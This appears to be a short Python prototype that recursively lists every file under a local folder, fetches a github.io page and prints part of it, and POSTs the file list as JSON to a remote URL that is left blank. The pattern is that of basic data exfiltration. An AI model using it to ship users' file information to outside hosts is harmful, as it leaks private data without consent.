import os
import requests
import json

def getFiles(path,listOfItems):
    os.chdir(path)
    dirList = []
    for item in os.listdir():
        if os.path.isdir(path+"//"+item):
            dirList.append(path+"//"+item)
        else:
            listOfItems.append(path+"//"+item) 
    if len(dirList)>0:
        for item in dirList:
            getFiles(item,listOfItems)

def getInfo():
    r = requests.get("https://gumkoman.github.io/SimpleHtmlWebside/")
    value = r.text.split("H1")
    print(value[1])

def sendData(listOfItems):
    url = ""
    jsonStr = json.dumps(listOfItems)
    print(jsonStr)
    x = requests.post(url, data = jsonStr)

if __name__ == "__main__":
    listOfItems = []
    getFiles("C:\PROJEKT_OAST",listOfItems)
    # for item in listOfItems:
    #     print("#",item)
    getInfo()
    sendData(listOfItems)